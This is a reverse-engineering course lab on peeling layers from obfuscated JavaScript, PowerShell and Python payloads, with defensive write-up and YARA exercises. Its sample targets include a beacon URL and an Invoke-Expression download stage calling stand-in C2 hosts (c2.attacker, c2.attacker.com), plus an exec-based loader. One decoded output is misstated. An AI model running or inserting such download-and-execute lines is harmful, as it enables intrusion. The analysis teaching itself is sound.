---
title: "Deobfuscation Lab — Deobfuscate a Script-Based Payload"
tags: [reverse-engineering, deobfuscation, javascript, powershell, python, lab]
module: 07-RE-02
day: 455
related_topics:
  - Obfuscation and Deobfuscation (Day 454)
  - Patch Diffing (Day 456)
  - Malware Analysis (Days 611–650)
---

# Day 455 — Deobfuscation Lab: Deobfuscate a Script-Based Payload

> "Compiled binary obfuscation is one problem. Script obfuscation is another.
> Most malware delivered through phishing is a script — PowerShell, JavaScript,
> VBScript. The obfuscation is usually reversible without a debugger.
> Read it. Understand it. Deobfuscate it."
>
> — Ghost

---

## Goals

Deobfuscate a multi-layer obfuscated JavaScript/PowerShell payload.
Apply manual string decoding, layer peeling, and safe execution techniques.
Produce a clean, readable version of the payload without running it.

**Prerequisites:** Day 454 (obfuscation categories), any scripting language fluency.
**Time budget:** 4 hours.

---

## Part 1 — Script Obfuscation vs Binary Obfuscation

| Property | Binary obfuscation | Script obfuscation |
|---|---|---|
| Primary tool | Ghidra + GDB | Text editor + scripting |
| Decompiler needed? | Yes | No — source is the code |
| Common technique | CFF, packing, VM | String encoding, concat, eval |
| Safe to run? | Never in prod | Only after full understanding |
| Undo technique | Emulate / hook | Parse → decode → deobfuscate |

Script obfuscation is typically layered:
```
Layer 3: eval(decompress(Layer2))
Layer 2: eval(base64decode(Layer1))
Layer 1: actual_payload_code
```

Peeling layers: decode the outermost layer, read it, decode the next, repeat.

---

## Part 2 — JavaScript Obfuscation Lab

### Target: Obfuscated JS Dropper

```javascript
// obfuscated_dropper.js — this is the lab target
// Level 1: character-code concatenation
var _0x1a2b = ['\x68\x74\x74\x70', '\x3a\x2f\x2f', '\x63\x32\x2e\x61\x74\x74\x61\x63\x6b\x65\x72'];
var _fn = function(i) { return _0x1a2b[i]; };
var url = _fn(0) + _fn(1) + _fn(2) + '/beacon';

// Level 2: eval with encoded body
var _payload = atob('Y29uc29sZS5sb2coJ0MySS1iZWFjb24nKTs=');
eval(_payload);

// Level 3: string split/join obfuscation
var cmd = ['W','S','c','r','i','p','t'].join('') + '.' + ['S','h','e','l','l'].join('');
```

### Deobfuscation Protocol (JavaScript)

**Step 1: Replace `eval` with `console.log`**

Never run eval blindly. Replace every `eval(x)` with `console.log(x)` to see
what would be executed without executing it.

```bash
sed 's/eval(/console.log(/g' obfuscated_dropper.js > safe_dropper.js
node safe_dropper.js    # now safe: prints what eval would have run
```

**Step 2: Decode each layer manually**

```python
# Layer 1: hex-escaped strings
chars = ['\x68\x74\x74\x70', '\x3a\x2f\x2f', '\x63\x32\x2e\x61\x74\x74\x61\x63\x6b\x65\x72']
for c in chars:
    print(repr(c))
# → 'http', '://', 'c2.attacker'
# URL = "http://c2.attacker/beacon"

# Layer 2: base64 body
import base64
payload = base64.b64decode('Y29uc29sZS5sb2coJ0MySS1iZWFjb24nKTs=')
print(payload.decode())
# → console.log('C2-beacon');

# Layer 3: split/join
cmd = 'WScript' + '.' + 'Shell'
print(cmd)
# → WScript.Shell  ← Windows script execution
```

**Step 3: Reconstruct the clean payload**

```javascript
// Clean version after full deobfuscation:
var url = "http://c2.attacker/beacon";
console.log('C2-beacon');
var cmd = "WScript.Shell";  // Windows script host shell — would execute commands
```

---

## Part 3 — PowerShell Obfuscation Lab

PowerShell is the most common malware delivery vector on Windows. Obfuscation
is extensive.

### Common PowerShell Obfuscation Techniques

```powershell
# Technique 1: String concatenation
"Inv"+"oke-Exp"+"ression"    # = Invoke-Expression (IEX)

# Technique 2: Backtick escaping
In`voke-Ex`pression

# Technique 3: Variable substitution
$env:COMSPEC    # = cmd.exe

# Technique 4: Base64 encoded command
powershell -EncodedCommand <base64>

# Technique 5: Char code array
[char[]](73,110,118,111,...) -join ''  # = "Invoke..."
```

### Lab: Deobfuscate a PowerShell Stage

```powershell
# obfuscated_stage.ps1 — target
$a = [System.Text.Encoding]::UTF8.GetString(
    [System.Convert]::FromBase64String(
        'SVdSIC1Vcmk='));
$b = $a + ' "http://c2.attacker.com/p"';
Invoke-Expression $b;
```

**Deobfuscation:**

```python
import base64

# Step 1: decode the base64
decoded = base64.b64decode('SVdSIC1Vcmk=').decode('utf-8')
print(decoded)
# → "IWR -Uri"  (short for Invoke-WebRequest -Uri)

# Step 2: reconstruct
b = decoded + ' "http://c2.attacker.com/p"'
print(b)
# → Invoke-WebRequest -Uri "http://c2.attacker.com/p"
# → Downloads something from the C2

# Conclusion: stage 1 downloads and runs stage 2 from the C2 server
```

### PowerShell Deobfuscation Tools

```
PSDecode: https://github.com/R3MRUM/PSDecode
  Automatically deobfuscates many PowerShell patterns

PowerDecode: similar — wraps PowerShell in safe mode

Manual: use Python to simulate base64 decode, char array join, etc.
```

---

## Part 4 — Python Obfuscation Lab

Python malware uses:
- `exec()` / `eval()` with base64-encoded bytecode
- `compile()` to obscure code
- `marshal` module to load pre-compiled `.pyc` bytecode

```python
# obfuscated.py — target
import base64, marshal, zlib
exec(marshal.loads(zlib.decompress(base64.b64decode(
    'eJwLyk/OLi0oS...'  # truncated for lab
))))
```

**Deobfuscation:**

```python
# Replace exec with print to see the bytecode object
import base64, marshal, zlib, dis

code = marshal.loads(zlib.decompress(base64.b64decode('eJwLyk/OLi0oS...')))
# Disassemble the code object:
dis.dis(code)
# → shows Python bytecode = human-readable
```

---

## Part 5 — Deobfuscation Write-Up Template

After deobfuscating any script:

```
## Deobfuscation Report

### Binary / Script
File: [name, hash]
Type: [JS dropper / PS stage / Python loader]

### Layers
Layer 1: [description — what encoding/obfuscation]
Layer 2: [description]
...

### Decoded Behaviour
1. Downloads [URL] using [method]
2. Executes the downloaded content as [type]
3. Establishes persistence via [mechanism]
4. C2 communication to: [addresses]

### Indicators of Compromise
- URL: http://...
- Filename: ...
- Registry key: ...

### ATT&CK Techniques
- T1059.001 — PowerShell
- T1027 — Obfuscated Files
- T1105 — Ingress Tool Transfer
```

---

## Key Takeaways

1. Script obfuscation is always layered. Peel one layer at a time — decode,
   read, decode the next.
2. Replace `eval`/`Invoke-Expression`/`exec` with a print equivalent before
   running anything. Never execute an obfuscated payload to understand it.
3. Base64 and hex encoding are not encryption — they are cosmetic obfuscation.
   Decode them with Python in seconds.
4. PowerShell's `Invoke-Expression` and JavaScript's `eval` are the obfuscation
   entry points. Find them and read what they would execute.
5. Always produce a clean write-up with IoCs after deobfuscation. This is what
   defenders need to write detection rules.

---

## Exercises

1. Write a Python function that strips all the common PowerShell obfuscation
   patterns (backticks, string concat, char arrays) and outputs clean cmdlets.
2. Find a real obfuscated PowerShell dropper from any.run or VirusTotal.
   Manually deobfuscate it layer by layer. Report the final payload's behaviour.
3. Obfuscate a simple Python script using base64 + marshal + exec. Give it to
   a colleague (or fresh session). Time how long it takes them to deobfuscate
   it manually.
4. Write a YARA rule that detects multi-layer base64+eval PowerShell droppers
   based on the patterns you found today.

---

## Questions

> Add your questions here. Each question gets a Global ID (Q455.1, Q455.2 …).

---

## Navigation

← Previous: [Day 454 — Obfuscation and Deobfuscation](DAY-0454-Obfuscation-and-Deobfuscation.md)
→ Next: [Day 456 — Patch Diffing](DAY-0456-Patch-Diffing.md)
